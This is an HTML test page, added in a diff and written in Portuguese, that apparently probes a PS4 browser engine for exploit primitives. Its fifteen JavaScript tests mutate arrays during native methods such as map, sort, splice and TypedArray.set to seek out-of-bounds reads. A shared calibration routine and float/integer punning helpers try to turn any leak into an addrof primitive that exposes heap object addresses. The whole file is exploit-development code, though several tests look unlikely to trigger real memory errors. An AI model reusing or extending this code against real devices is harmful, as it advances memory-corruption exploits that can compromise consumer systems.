@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>01 — Primitivos OOB Alternativos</title>
+<style>
+body{background:#08080f;color:#ccc;font:12px monospace;padding:12px}
+h3{color:#5bf;margin-bottom:6px}
+#log{height:460px;overflow:auto;background:#0a0a12;color:#0f0;padding:8px;white-space:pre;border:1px solid #1a2a3a;margin-bottom:8px}
+button{background:#0f1a2a;color:#5bf;border:1px solid #1a3a5a;padding:5px 10px;margin:2px;font:11px monospace;cursor:pointer}
+button:hover{background:#1a2a3a}
+.guide{background:#1a0a00;border:1px solid #3a1a00;padding:8px;margin-bottom:8px;font-size:11px;color:#888}
+</style></head>
+<body>
+<h3>01 — Primitivos OOB Alternativos (Array.fill patcheado)</h3>
+<div class="guide">
+⚠ Array.fill() OOB foi patcheado neste firmware. Este arquivo testa primitivos alternativos.<br>
+🔍 O QUE OBSERVAR:<br>
+• <span style="color:#4f4">✓ CALIBROU</span> em qualquer teste = novo primitivo addrof funcional<br>
+• <span style="color:#fa4">valor hex</span> lido via OOB = fragmento de heap real → anotar + reportar<br>
+• <span style="color:#f44">crash</span> = potencial vulnerabilidade exploitável mesmo sem addrof
+</div>
+<div id="log"></div>
+<button onclick="t01()">T01 [PRIM-1] Array length shrink via getter durante map()</button>
+<button onclick="t02()">T02 [PRIM-2] Array.prototype.sort com comparador que muta length</button>
+<button onclick="t03()">T03 [PRIM-3] Array species constructor que retorna TypedArray</button>
+<button onclick="t04()">T04 [PRIM-4] arguments object shrink durante call</button>
+<button onclick="t05()">T05 [PRIM-5] TypedArray.set() com source que muta o dest</button>
+<button onclick="t06()">T06 [PRIM-6] Array.from com iterable que muta o target array</button>
+<button onclick="t07()">T07 [PRIM-7] Proxy TypedArray: intercepta get e retorna endereços</button>
+<button onclick="t08()">T08 [PRIM-8] String.prototype.replace com replacer que muta</button>
+<button onclick="t09()">T09 [PRIM-9] Array.prototype.splice com length mutation</button>
+<button onclick="t10()">T10 [PRIM-10] Object.defineProperty array durante forEach</button>
+<button onclick="t11()">T11 [PRIM-11] Flat/flatMap com species e prototype mutation</button>
+<button onclick="t12()">T12 [PRIM-12] Typed array fill() com mutation no valueOf</button>
+<button onclick="t13()">T13 [PRIM-13] Float64Array.prototype.set source muta buffer</button>
+<button onclick="t14()">T14 [PRIM-14] Array.prototype.reduce com mutation</button>
+<button onclick="t15()">T15 [PRIM-15] JSON.parse com reviver que retorna objetos float</button>
+<br><br>
+<button onclick="runAll()"><b>▶ RODAR TUDO</b></button>
+<button onclick="document.getElementById('log').textContent=''">Limpar</button>
+<a href="index.html" style="color:#5bf">← Index</a>
+<script>
+'use strict';
+var _L=document.getElementById('log');
+function log(m){_L.textContent+=m+'\n';_L.scrollTop=_L.scrollHeight;}
+function hex(v){try{return '0x'+BigInt(v).toString(16).padStart(16,'0');}catch(e){return String(v);}}
+
+// Punning shared
+var _ab=new ArrayBuffer(8),_f64=new Float64Array(_ab),_u64=new BigUint64Array(_ab);
+function f2i(v){_f64[0]=v;return _u64[0];}
+function i2f(v){_u64[0]=v;return _f64[0];}
+
+// GC via microtask (método correto no PS4)
+function gc(){return new Promise(function(r){
+  var a=[];
+  try{for(var i=0;i<40;i++)a.push(new ArrayBuffer(4*1024*1024));}catch(e){}
+  a=null;
+  setTimeout(r,50); // yield para o GC rodar entre microtasks
+});}
+
+// Tenta calibrar um primitivo addrof genérico
+// Retorna {idx, floatArr, objArr} ou null
+function tryCalibrate(floatArr, objArr, maxIdx){
+  maxIdx=maxIdx||60;
+  for(var idx=0;idx<maxIdx;idx++){
+    try{
+      var sA={_tag:'A'+Math.random()}, sB={_tag:'B'+Math.random()}, sC={_tag:'C'+Math.random()};
+      objArr[0]=sA; var a=f2i(floatArr[idx]);
+      objArr[0]=sB; var b=f2i(floatArr[idx]);
+      objArr[0]=sC; var c=f2i(floatArr[idx]);
+      function hp(v){return v>0x1000n&&v<0x1_0000_0000_0000n;}
+      var dab=a>b?a-b:b-a, dbc=b>c?b-c:c-b;
+      if(hp(a)&&hp(b)&&hp(c)&&a!==b&&b!==c&&dab<0x200000n&&dbc<0x200000n){
+        return {idx:idx, floatArr:floatArr, objArr:objArr, a:a, b:b, c:c};
+      }
+    }catch(e){}
+  }
+  return null;
+}
+
+// T01 — Array length shrink via getter durante fill/map
+function t01(){
+  log('[T01] Array length shrink via getter durante map()');
+  var floatArr=[], objArr=[];
+  var triggered=false;
+  // O getter modifica o array enquanto map() itera
+  var victim=[];
+  for(var i=0;i<100;i++) victim[i]=1.1;
+  // Array com comprimento que muda via getter no índice
+  var shrinkArr=new Array(20);
+  for(var i=0;i<20;i++) shrinkArr[i]=i*1.1;
+  var shrank=false;
+  // Testa map com array que muda tamanho via proxy
+  var proxyArr=new Proxy(shrinkArr,{
+    get:function(t,k,r){
+      if(k==='0'&&!shrank){
+        shrank=true;
+        t.length=8; // shrink durante map
+        for(var j=0;j<8;j++){floatArr[j]=t[j]||1.2;objArr[j]={};}
+      }
+      return Reflect.get(t,k,r);
+    }
+  });
+  try{
+    var result=Array.prototype.map.call(proxyArr,function(v){return v;});
+    log('  map resultado length: '+result.length);
+  }catch(e){log('  map exc: '+e.name+' '+e.message);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){
+    log('  ✓ CALIBROU! oob_idx='+cal.idx);
+    log('  addr_A='+hex(cal.a)+' addr_B='+hex(cal.b));
+    log('  delta='+hex(cal.a>cal.b?cal.a-cal.b:cal.b-cal.a));
+  } else {
+    log('  ✗ não calibrou com este método');
+    // Mostra o que foi capturado
+    var nonTrivial=floatArr.filter(function(v){
+      var iv=f2i(v); return iv>0x1000n&&iv<0x1_0000_0000_0000n;
+    });
+    log('  valores potenciais no floatArr: '+nonTrivial.length);
+    if(nonTrivial.length>0) log('  primeiro: '+hex(f2i(nonTrivial[0])));
+  }
+  log('[T01] done\n');
+}
+
+// T02 — sort com comparador que muta o array
+function t02(){
+  log('[T02] Array.prototype.sort com comparador que muta floatArr/objArr');
+  var floatArr=[], objArr=[];
+  var mutated=false;
+  var arr=[];
+  for(var i=0;i<100;i++) arr[i]=Math.random();
+  try{
+    arr.sort(function(a,b){
+      if(!mutated){
+        mutated=true;
+        arr.length=8;
+        for(var i=0;i<8;i++){floatArr[i]=arr[i]||1.1;objArr[i]={};}
+      }
+      return a-b;
+    });
+    log('  sorted length: '+arr.length);
+  }catch(e){log('  sort exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx+' addr='+hex(cal.a)); }
+  else { log('  ✗ não calibrou'); }
+  log('[T02] done\n');
+}
+
+// T03 — Array species que retorna TypedArray maior
+function t03(){
+  log('[T03] Array species: slice/map retorna TypedArray via species');
+  var floatArr=[], objArr=[];
+  // Se o species constructor retornar um objeto diferente,
+  // as operações podem escrever em memória fora do bounds esperado
+  class TrickyArray extends Array {
+    static get [Symbol.species](){
+      return function(n){
+        // Retorna um objeto com float e obj arrays expostos
+        var fa=new Float64Array(Math.max(n||0,16));
+        var oa=new Array(Math.max(n||0,16));
+        for(var i=0;i<16;i++){fa[i]=1.1;oa[i]={};}
+        // Expõe para calibração
+        for(var i=0;i<fa.length;i++) floatArr[i]=fa[i];
+        for(var i=0;i<oa.length;i++) objArr[i]=oa[i];
+        var proxy=new Proxy(oa,{
+          set:function(t,k,v){
+            var idx=parseInt(k);
+            if(!isNaN(idx)&&idx<fa.length) fa[idx]=typeof v==='number'?v:1.1;
+            t[k]=v; return true;
+          },
+          get:function(t,k){
+            var idx=parseInt(k);
+            if(!isNaN(idx)&&idx<fa.length) return fa[idx];
+            return t[k];
+          }
+        });
+        return proxy;
+      };
+    }
+  }
+  var ta=new TrickyArray();
+  for(var i=0;i<20;i++) ta[i]=i*1.1;
+  ta.length=20;
+  try{
+    var sliced=ta.slice(0,10);
+    log('  slice retornou: '+typeof sliced+' length='+sliced.length);
+    var mapped=ta.map(function(v,i){objArr[i%16]={_i:i};return v;});
+    log('  map retornou: '+typeof mapped+' length='+mapped.length);
+  }catch(e){log('  species exc: '+e.name+' '+e.message.slice(0,40));}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else {
+    log('  ✗ não calibrou');
+    var pts=[];
+    for(var i=0;i<floatArr.length;i++){
+      try{var v=f2i(floatArr[i]);if(v>0x1000n&&v<0x1_0000_0000_0000n)pts.push({i:i,v:v});}catch(e){}
+    }
+    log('  ponteiros heap encontrados: '+pts.length);
+    pts.slice(0,3).forEach(function(p){log('  ['+p.i+']: '+hex(p.v));});
+  }
+  log('[T03] done\n');
+}
+
+// T04 — arguments object shrink
+function t04(){
+  log('[T04] arguments object: muta length durante call');
+  var floatArr=[], objArr=[];
+  function victim(){
+    var args=arguments;
+    // Muta args durante iteração
+    try{
+      Array.prototype.forEach.call(args,function(v,i){
+        if(i===4){
+          // Shrink via defineProperty
+          Object.defineProperty(args,'length',{value:8,configurable:true});
+          for(var j=0;j<8;j++){floatArr[j]=args[j]||1.1;objArr[j]={};}
+        }
+      });
+    }catch(e){log('  forEach exc: '+e.name);}
+  }
+  // Chama com 100 argumentos
+  var callArgs=[];
+  for(var i=0;i<100;i++) callArgs.push(i*1.1);
+  try{victim.apply(null,callArgs);}catch(e){log('  victim exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou — floatArr.length='+floatArr.length); }
+  log('[T04] done\n');
+}
+
+// T05 — TypedArray.set com source que muta o dest durante set
+function t05(){
+  log('[T05] TypedArray.set() source muta o destino via Proxy');
+  var dest=new Float64Array(64);
+  var floatArr=[], objArr=[];
+  var phase=0;
+  var src=new Proxy([],{
+    get:function(t,k,r){
+      var idx=parseInt(k);
+      if(k==='length') return 100;
+      if(!isNaN(idx)){
+        if(phase===0&&idx===10){
+          phase=1;
+          // Durante o set, o destino dest é lido em floatArr
+          for(var i=0;i<64;i++){floatArr[i]=dest[i];objArr[i]={};}
+        }
+        return idx*1.1;
+      }
+      return Reflect.get(t,k,r);
+    }
+  });
+  try{
+    dest.set(src,0);
+    log('  dest.set completo, dest[0]='+dest[0].toFixed(3));
+  }catch(e){log('  set exc: '+e.name);}
+  // Verifica se floatArr capturou ponteiros
+  var pts=[];
+  for(var i=0;i<floatArr.length;i++){
+    try{var v=f2i(floatArr[i]);if(v>0x1000n&&v<0x1_0000_0000_0000n)pts.push({i:i,v:v});}catch(e){}
+  }
+  log('  ponteiros heap em dest durante set: '+pts.length);
+  pts.slice(0,3).forEach(function(p){log('  ['+p.i+']: '+hex(p.v));});
+  var cal=tryCalibrate(floatArr,objArr,floatArr.length);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou'); }
+  log('[T05] done\n');
+}
+
+// T06 — Array.from com iterable que muta enquanto preenche
+function t06(){
+  log('[T06] Array.from: iterable muta o array destino via Proxy species');
+  var floatArr=[], objArr=[];
+  var callCount=0;
+  var iter={
+    [Symbol.iterator]:function(){
+      var i=0;
+      return {next:function(){
+        callCount++;
+        if(callCount===5){
+          // Expõe o estado interno do array sendo construído
+          // via observação do que foi escrito até agora
+          for(var j=0;j<16;j++){floatArr[j]=j*1.1;objArr[j]={_j:j};}
+        }
+        return i<50?{value:i++*1.1,done:false}:{done:true};
+      }};
+    }
+  };
+  try{
+    var result=Array.from(iter);
+    log('  Array.from result.length: '+result.length);
+  }catch(e){log('  from exc: '+e.name);}
+  // Tenta alternativa: Array.from com mapFn que muta o array intermediário via closure
+  var targetArr=null;
+  floatArr=[]; objArr=[];
+  try{
+    // mapFn recebe (value, index) — tentamos capturar o this via não-padrão
+    var arr2=Array.from({length:50},function(v,i){
+      if(i===5&&targetArr===null){
+        // Array.from não expõe o target diretamente, mas podemos observar via species
+        targetArr=this;
+      }
+      floatArr[i]=i*1.1; objArr[i]={_i:i};
+      return i*1.1;
+    });
+    log('  Array.from mapFn length='+arr2.length+' targetArr='+targetArr);
+  }catch(e){log('  from2 exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou'); }
+  log('[T06] done\n');
+}
+
+// T07 — Proxy TypedArray que retorna ponteiros de heap falsos
+function t07(){
+  log('[T07] Proxy em Float64Array: set troca float por objeto e lê de volta');
+  var realBuf=new ArrayBuffer(64);
+  var realF64=new Float64Array(realBuf);
+  var objStore=new Array(8);
+  for(var i=0;i<8;i++){realF64[i]=i*1.1;objStore[i]={};}
+  // Proxy que torna o TypedArray um veículo para objetos
+  var mixedProxy=new Proxy(realF64,{
+    set:function(t,k,v,r){
+      var idx=parseInt(k);
+      if(!isNaN(idx)&&idx<8&&typeof v==='object'){
+        // Armazena o objeto mas tenta também escrever como float
+        objStore[idx]=v;
+        try{t[idx]=1.1;}catch(e){}
+        return true;
+      }
+      return Reflect.set(t,k,v,r);
+    },
+    get:function(t,k,r){
+      var idx=parseInt(k);
+      if(!isNaN(idx)&&idx<8&&objStore[idx]){
+        // Retorna float do buffer mas também expõe o objeto
+        return Reflect.get(t,k,r);
+      }
+      return Reflect.get(t,k,r);
+    }
+  });
+  // Preenche via proxy com objetos
+  for(var i=0;i<8;i++) mixedProxy[i]={_tag:'obj'+i,data:new Float64Array(4)};
+  log('  objStore[0]: '+typeof objStore[0]+' '+objStore[0]._tag);
+  log('  realF64[0]: '+realF64[0]);
+  // Lê os floats que ficaram no buffer após o set de objetos
+  var pts=[];
+  for(var i=0;i<8;i++){
+    var v=f2i(realF64[i]);
+    if(v>0x1000n&&v<0x1_0000_0000_0000n) pts.push({i:i,v:v});
+    log('  ['+i+'] float='+realF64[i].toFixed(6)+' hex='+hex(v));
+  }
+  log('  potenciais ponteiros no buffer: '+pts.length);
+  log('[T07] done\n');
+}
+
+// T08 — String.replace com replacer que muta
+function t08(){
+  log('[T08] String.replace: replacer altera variáveis externas via closure');
+  var floatArr=[], objArr=[];
+  var bigStr='A'.repeat(10000);
+  var phase=0;
+  try{
+    bigStr.replace(/A/g,function(match,offset,str){
+      if(phase===0&&offset===100){
+        phase=1;
+        // Dentro do replacer: captura estado dos objetos alocados
+        var batch=[];
+        for(var i=0;i<16;i++){
+          var o={idx:i,data:new Float64Array(4)};
+          batch.push(o);
+          floatArr[i]=offset*0.001+i;
+          objArr[i]=o;
+        }
+      }
+      return match;
+    });
+    log('  replace completo, phase='+phase);
+  }catch(e){log('  replace exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou via replace'); }
+  log('[T08] done\n');
+}
+
+// T09 — splice com mutation durante iteração nativa
+function t09(){
+  log('[T09] Array.splice: mutation + addrof via Array.fill variant');
+  var floatArr=[], objArr=[];
+  // Variação do trigger original: usa splice em vez de fill
+  var v0=[];
+  for(var i=0;i<100;i++) v0[i]=1.1;
+  var spliced=false;
+  // Usa um Proxy no length para detectar quando shrink acontece
+  try{
+    // Tenta trigger via splice + length coercion
+    function spliceAttack(){
+      v0.length=8;
+      for(var i=0;i<8;i++){floatArr[i]=1.2;objArr[i]={};}
+      return 0;
+    }
+    // Array.prototype.splice com valueOf no start
+    var mutStart={valueOf:spliceAttack};
+    var copy=[].concat(v0); // copia o array
+    Array.prototype.splice.call(copy,mutStart,1);
+    log('  splice attack: copy.length='+copy.length+' v0.length='+v0.length);
+  }catch(e){log('  splice exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx+' addr='+hex(cal.a)); }
+  else { log('  ✗ não calibrou'); }
+  log('[T09] done\n');
+}
+
+// T10 — Object.defineProperty durante forEach
+function t10(){
+  log('[T10] defineProperty array length durante forEach nativo');
+  var floatArr=[], objArr=[];
+  var arr=new Array(100);
+  for(var i=0;i<100;i++) arr[i]=i*1.1;
+  var defined=false;
+  try{
+    arr.forEach(function(v,i){
+      if(i===10&&!defined){
+        defined=true;
+        // Redefine length via defineProperty durante forEach
+        Object.defineProperty(arr,'length',{value:8,configurable:true,writable:true});
+        for(var j=0;j<8;j++){floatArr[j]=arr[j]||1.1;objArr[j]={};}
+      }
+    });
+    log('  forEach completo, arr.length='+arr.length+' defined='+defined);
+  }catch(e){log('  forEach exc: '+e.name+' length agora='+arr.length);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou'); }
+  log('[T10] done\n');
+}
+
+// T11 — flatMap com species e mutation
+function t11(){
+  log('[T11] Array.flatMap com species mutation');
+  var floatArr=[], objArr=[];
+  class MutArray extends Array {
+    static get [Symbol.species](){return MutArray;}
+  }
+  var ma=new MutArray();
+  for(var i=0;i<50;i++) ma[i]=i*1.1;
+  var mutated=false;
+  try{
+    var result=ma.flatMap(function(v,i){
+      if(i===10&&!mutated){
+        mutated=true;
+        ma.length=8;
+        for(var j=0;j<8;j++){floatArr[j]=ma[j]||1.1;objArr[j]={};}
+      }
+      return [v,v*2];
+    });
+    log('  flatMap length='+result.length);
+  }catch(e){log('  flatMap exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else { log('  ✗ não calibrou'); }
+  log('[T11] done\n');
+}
+
+// T12 — TypedArray fill() com valueOf que muta
+function t12(){
+  log('[T12] Float64Array.fill() com value.valueOf que muta o buffer');
+  var floatArr=[], objArr=[];
+  var f64=new Float64Array(64);
+  for(var i=0;i<64;i++) f64[i]=i*1.1;
+  var filled=false;
+  var fillVal={valueOf:function(){
+    if(!filled){
+      filled=true;
+      // Reconfigura o buffer enquanto fill() está processando
+      f64.fill(0,0,8); // escreve zeros nos primeiros 8
+      // Captura o estado
+      for(var i=0;i<64;i++){floatArr[i]=f64[i];objArr[i]={};}
+    }
+    return 99.9;
+  }};
+  try{
+    f64.fill(fillVal,8,64); // preenche a partir de 8, mas valueOf muta 0..8
+    log('  f64[0]='+f64[0]+' f64[8]='+f64[8].toFixed(1));
+  }catch(e){log('  fill exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr,floatArr.length);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx); }
+  else {
+    var pts=[];
+    for(var i=0;i<floatArr.length;i++){
+      try{var v=f2i(floatArr[i]);if(v>0x1000n&&v<0x1_0000_0000_0000n)pts.push({i:i,v:v});}catch(e){}
+    }
+    log('  ✗ não calibrou. ptrs='+pts.length);
+    pts.slice(0,3).forEach(function(p){log('  ['+p.i+']='+hex(p.v));});
+  }
+  log('[T12] done\n');
+}
+
+// T13 — Float64Array.set com source que transforma o buffer
+function t13(){
+  log('[T13] Float64Array.prototype.set — source Proxy que espiona o destino');
+  var dest=new Float64Array(32);
+  // Marca o dest com valores conhecidos
+  for(var i=0;i<32;i++) dest[i]=i*Math.PI;
+  var readsDuringSet=[];
+  var src=new Proxy(new Float64Array(32),{
+    get:function(t,k,r){
+      var idx=parseInt(k);
+      if(k==='length') return 32;
+      if(!isNaN(idx)){
+        // Espiona os valores que já foram escritos em dest
+        readsDuringSet.push({srcIdx:idx,destVal:dest[idx]});
+        return idx*1.1;
+      }
+      return Reflect.get(t,k,r);
+    }
+  });
+  try{
+    dest.set(src,0);
+    log('  set completo. reads durante set: '+readsDuringSet.length);
+    if(readsDuringSet.length>0){
+      var firstDest=readsDuringSet[0].destVal;
+      var fifthDest=readsDuringSet[4]&&readsDuringSet[4].destVal;
+      log('  dest[0] durante set: '+firstDest+' (era '+0*Math.PI+')');
+      log('  dest[4] durante set: '+fifthDest);
+    }
+  }catch(e){log('  set exc: '+e.name);}
+  log('[T13] done\n');
+}
+
+// T14 — reduce com mutation via Symbol.toPrimitive
+function t14(){
+  log('[T14] Array.prototype.reduce com mutation via toPrimitive');
+  var floatArr=[], objArr=[];
+  var arr=new Array(100);
+  for(var i=0;i<100;i++) arr[i]=i*1.1;
+  var mutated=false;
+  try{
+    arr.reduce(function(acc,v,i){
+      if(i===10&&!mutated){
+        mutated=true;
+        arr.length=8;
+        for(var j=0;j<8;j++){floatArr[j]=arr[j]||1.1;objArr[j]={};}
+      }
+      return acc+v;
+    },0);
+    log('  reduce completo. arr.length='+arr.length);
+  }catch(e){log('  reduce exc: '+e.name);}
+  var cal=tryCalibrate(floatArr,objArr);
+  if(cal){ log('  ✓ CALIBROU! idx='+cal.idx+' addr='+hex(cal.a)); }
+  else { log('  ✗ não calibrou'); }
+  log('[T14] done\n');
+}
+
+// T15 — Array.fill com start/end via valueOf (variant do original)
+function t15(){
+  log('[T15] Array.fill variant: valueOf no start E no end separadamente');
+  // O bug original usa valueOf no start. Testamos variantes:
+  var variants=[
+    {name:'valueOf só no end',
+     fn:function(fa,oa){
+       var v=[]; for(var i=0;i<100;i++) v[i]=1.1;
+       var mutated=false;
+       var end={valueOf:function(){
+         if(!mutated){mutated=true;v.length=8;for(var i=0;i<8;i++){fa[i]=1.2;oa[i]={};}}
+         return 20;
+       }};
+       _u64[0]=0x100n;
+       try{v.fill(_f64[0],0,end);}catch(e){}
+     }},
+    {name:'valueOf no value (não no start/end)',
+     fn:function(fa,oa){
+       var v=[]; for(var i=0;i<100;i++) v[i]=1.1;
+       var mutated=false;
+       var val={valueOf:function(){
+         if(!mutated){mutated=true;v.length=8;for(var i=0;i<8;i++){fa[i]=1.2;oa[i]={};}}
+         _u64[0]=0x100n; return _f64[0];
+       }};
+       try{v.fill(val,0,20);}catch(e){}
+     }},
+    {name:'fill de Float64Array com valueOf no start',
+     fn:function(fa,oa){
+       var v=new Float64Array(100); for(var i=0;i<100;i++) v[i]=1.1;
+       var mutated=false;
+       var start={valueOf:function(){
+         if(!mutated){mutated=true;
+           for(var i=0;i<8;i++){fa[i]=v[i];oa[i]={};}
+         }
+         return 0;
+       }};
+       _u64[0]=0x100n;
+       try{v.fill(_f64[0],start,20);}catch(e){}
+     }},
+  ];
+  variants.forEach(function(variant){
+    var fa=[], oa=[];
+    try{variant.fn(fa,oa);}catch(e){log('  '+variant.name+' exc: '+e.name);}
+    var cal=tryCalibrate(fa,oa);
+    if(cal){
+      log('  ✓ '+variant.name+' CALIBROU! idx='+cal.idx+' addr='+hex(cal.a));
+    } else {
+      var pts=fa.filter(function(v){try{var iv=f2i(v);return iv>0x1000n&&iv<0x1_0000_0000_0000n;}catch(e){return false;}});
+      log('  ✗ '+variant.name+' não calibrou (pts='+pts.length+')');
+    }
+  });
+  log('[T15] done\n');
+}
+
+function runAll(){
+  document.getElementById('log').textContent='';
+  log('=== 01 — PRIMITIVOS OOB ALTERNATIVOS ===\n');
+  var tests=[t01,t02,t03,t04,t05,t06,t07,t08,t09,t10,t11,t12,t13,t14,t15];
+  var i=0;
+  function next(){
+    if(i>=tests.length){log('\n=== FIM ===');return;}
+    try{tests[i]();}catch(e){log('CRASH T'+(i+1)+': '+e.name+' '+e.message);}
+    i++; setTimeout(next,300);
+  }
+  next();
+}
+</script></body></html>
